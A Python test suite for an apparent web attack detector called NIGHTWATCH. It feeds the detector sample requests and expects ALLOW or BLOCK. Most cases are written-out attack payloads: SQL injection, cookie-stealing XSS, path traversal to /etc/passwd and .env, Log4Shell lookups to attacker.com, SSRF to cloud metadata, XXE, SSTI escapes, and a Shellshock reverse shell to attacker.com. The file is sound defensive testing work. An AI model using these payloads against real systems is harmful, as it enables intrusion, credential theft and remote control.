"""
tests/test_phase1.py
NIGHTWATCH Phase 1 — Test Suite

Run with:
    python tests/test_phase1.py
"""

import sys
import os

# Allow imports from project root
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.engine import analyze
from core.regex_rules import RULES, list_attack_types

# ── ANSI colors for readable output ──────────────────────────────────
GREEN  = "\033[92m"
RED    = "\033[91m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

# ──────────────────────────────────────────────────────────────────────
#  Test cases
#  Each has: name, request dict, expected verdict
# ──────────────────────────────────────────────────────────────────────

TESTS = [

    # ── Clean (should ALLOW) ──────────────────────────────────────
    {
        "name": "✔ Clean GET request",
        "request": {
            "method": "GET",
            "url": "/products?category=shoes&page=2",
            "headers": {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64)"},
            "body": "",
            "ip": "8.8.8.8",
        },
        "expected": "ALLOW",
    },
    {
        "name": "✔ Clean POST login",
        "request": {
            "method": "POST",
            "url": "/api/login",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "body": '{"username": "alice", "password": "SecurePass123!"}',
            "ip": "1.1.1.1",
        },
        "expected": "ALLOW",
    },

    # ── SQL Injection ─────────────────────────────────────────────
    {
        "name": "⚠ SQLi UNION SELECT",
        "request": {
            "method": "GET",
            "url": "/search?q=1' UNION SELECT username,password FROM users--",
            "headers": {"User-Agent": "Mozilla/5.0"},
            "body": "",
            "ip": "10.0.0.1",
        },
        "expected": "BLOCK",
    },
    {
        "name": "⚠ SQLi SLEEP time-based",
        "request": {
            "method": "GET",
            "url": "/item?id=1; SELECT SLEEP(5)--",
            "headers": {"User-Agent": "sqlmap/1.7"},
            "body": "",
            "ip": "10.0.0.2",
        },
        "expected": "BLOCK",
    },
    {
        "name": "⚠ SQLi information_schema",
        "request": {
            "method": "GET",
            "url": "/api/data?table=information_schema.tables",
            "headers": {"User-Agent": "Mozilla/5.0"},
            "body": "",
            "ip": "10.0.0.3",
        },
        "expected": "BLOCK",
    },

    # ── XSS ──────────────────────────────────────────────────────
    {
        "name": "⚠ XSS <script> tag",
        "request": {
            "method": "GET",
            "url": '/search?q=<script>alert("XSS")</script>',
            "headers": {"User-Agent": "Mozilla/5.0"},
            "body": "",
            "ip": "2.2.2.2",
        },
        "expected": "BLOCK",
    },
    {
        "name": "⚠ XSS onerror event handler",
        "request": {
            "method": "POST",
            "url": "/comment",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "body": "text=hello<img src=x onerror=alert(document.cookie)>",
            "ip": "3.3.3.3",
        },
        "expected": "BLOCK",
    },
    {
        "name": "⚠ XSS javascript: URI",
        "request": {
            "method": "GET",
            "url": "/redirect?url=javascript:alert(1)",
            "headers": {"User-Agent": "Mozilla/5.0"},
            "body": "",
            "ip": "3.3.3.4",
        },
        "expected": "BLOCK",
    },

    # ── Path Traversal ────────────────────────────────────────────
    {
        "name": "⚠ Path Traversal ../../etc/passwd",
        "request": {
            "method": "GET",
            "url": "/download?file=../../../../etc/passwd",
            "headers": {"User-Agent": "Mozilla/5.0"},
            "body": "",
            "ip": "4.4.4.4",
        },
        "expected": "BLOCK",
    },
    {
        "name": "⚠ Path Traversal .env config file",
        "request": {
            "method": "GET",
            "url": "/static/../.env",
            "headers": {"User-Agent": "Mozilla/5.0"},
            "body": "",
            "ip": "4.4.4.5",
        },
        "expected": "BLOCK",
    },

    # ── Command Injection ─────────────────────────────────────────
    {
        "name": "⚠ CMDi ping; ls -la",
        "request": {
            "method": "GET",
            "url": "/ping?host=127.0.0.1; ls -la",
            "headers": {"User-Agent": "Mozilla/5.0"},
            "body": "",
            "ip": "5.5.5.5",
        },
        "expected": "BLOCK",
    },
    {
        "name": "⚠ CMDi backtick subshell",
        "request": {
            "method": "POST",
            "url": "/api/run",
            "headers": {"Content-Type": "application/x-www-form-urlencoded"},
            "body": "cmd=`whoami`",
            "ip": "5.5.5.6",
        },
        "expected": "BLOCK",
    },

    # ── Log4Shell ─────────────────────────────────────────────────
    {
        "name": "⚠ Log4Shell in User-Agent",
        "request": {
            "method": "GET",
            "url": "/",
            "headers": {"User-Agent": "${jndi:ldap://attacker.com/exploit}"},
            "body": "",
            "ip": "6.6.6.6",
        },
        "expected": "BLOCK",
    },
    {
        "name": "⚠ Log4Shell obfuscated nested",
        "request": {
            "method": "GET",
            "url": "/",
            "headers": {"X-Forwarded-For": "${${lower:j}ndi:ldap://evil.com/a}"},
            "body": "",
            "ip": "6.6.6.7",
        },
        "expected": "BLOCK",
    },

    # ── SSRF ──────────────────────────────────────────────────────
    {
        "name": "⚠ SSRF AWS metadata endpoint",
        "request": {
            "method": "GET",
            "url": "/fetch?url=http://169.254.169.254/latest/meta-data/",
            "headers": {"User-Agent": "Mozilla/5.0"},
            "body": "",
            "ip": "7.7.7.7",
        },
        "expected": "BLOCK",
    },
    {
        "name": "⚠ SSRF internal 192.168.x.x",
        "request": {
            "method": "GET",
            "url": "/proxy?target=http://192.168.1.1/admin",
            "headers": {"User-Agent": "Mozilla/5.0"},
            "body": "",
            "ip": "7.7.7.8",
        },
        "expected": "BLOCK",
    },
    {
        "name": "⚠ SSRF gopher:// scheme",
        "request": {
            "method": "GET",
            "url": "/open?resource=gopher://internal-redis:6379/_*1",
            "headers": {"User-Agent": "Mozilla/5.0"},
            "body": "",
            "ip": "7.7.7.9",
        },
        "expected": "BLOCK",
    },

    # ── XXE ───────────────────────────────────────────────────────
    {
        "name": "⚠ XXE DOCTYPE + SYSTEM entity",
        "request": {
            "method": "POST",
            "url": "/api/xml",
            "headers": {"Content-Type": "application/xml", "User-Agent": "Mozilla/5.0"},
            "body": (
                '<?xml version="1.0"?>'
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                '<foo>&xxe;</foo>'
            ),
            "ip": "8.8.4.4",
        },
        "expected": "BLOCK",
    },

    # ── SSTI ──────────────────────────────────────────────────────
    {
        "name": "⚠ SSTI Jinja2 {{7*7}}",
        "request": {
            "method": "GET",
            "url": "/greet?name={{7*7}}",
            "headers": {"User-Agent": "Mozilla/5.0"},
            "body": "",
            "ip": "9.9.9.9",
        },
        "expected": "BLOCK",
    },
    {
        "name": "⚠ SSTI Python sandbox escape (__class__)",
        "request": {
            "method": "GET",
            "url": "/template?t={{''.__class__.__mro__[1].__subclasses__()}}",
            "headers": {"User-Agent": "Mozilla/5.0"},
            "body": "",
            "ip": "9.9.9.8",
        },
        "expected": "BLOCK",
    },

    # ── Shellshock ────────────────────────────────────────────────
    {
        "name": "⚠ Shellshock in User-Agent",
        "request": {
            "method": "GET",
            "url": "/cgi-bin/test.cgi",
            "headers": {"User-Agent": "() { :; }; /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1"},
            "body": "",
            "ip": "11.11.11.11",
        },
        "expected": "BLOCK",
    },
]


# ──────────────────────────────────────────────────────────────────────

def run_test(test: dict) -> bool:
    name     = test["name"]
    request  = test["request"]
    expected = test["expected"]

    result  = analyze(request)
    verdict = result["verdict"]
    passed  = verdict == expected

    status_str = f"{GREEN}PASS{RESET}" if passed else f"{RED}FAIL{RESET}"
    print(f"\n  [{status_str}] {name}")
    print(f"         Verdict : {CYAN}{verdict}{RESET}  (expected: {expected})")
    print(f"         Risk    : {result['risk_score']}")

    if result["matched_rules"]:
        for r in result["matched_rules"]:
            sev_color = RED if r["severity"] == "CRITICAL" else YELLOW
            print(f"         ⚑ [{sev_color}{r['severity']}{RESET}] {r['id']} — {r['name']}")
    else:
        print(f"         No rules matched.")

    return passed


def main():
    print(f"\n{BOLD}{CYAN}{'═'*65}{RESET}")
    print(f"{BOLD}{CYAN}  🦉 NIGHTWATCH — Phase 1 Test Suite{RESET}")
    print(f"{CYAN}  Rules loaded  : {len(RULES)}{RESET}")
    print(f"{CYAN}  Attack types  : {', '.join(list_attack_types())}{RESET}")
    print(f"{CYAN}  Test cases    : {len(TESTS)}{RESET}")
    print(f"{BOLD}{CYAN}{'═'*65}{RESET}")

    passed = sum(run_test(t) for t in TESTS)
    total  = len(TESTS)

    print(f"\n{BOLD}{'═'*65}")
    color  = GREEN if passed == total else (YELLOW if passed >= total * 0.8 else RED)
    print(f"  Result: {color}{passed}/{total} passed{RESET}")
    print(f"{'═'*65}\n")

    sys.exit(0 if passed == total else 1)


if __name__ == "__main__":
    main()
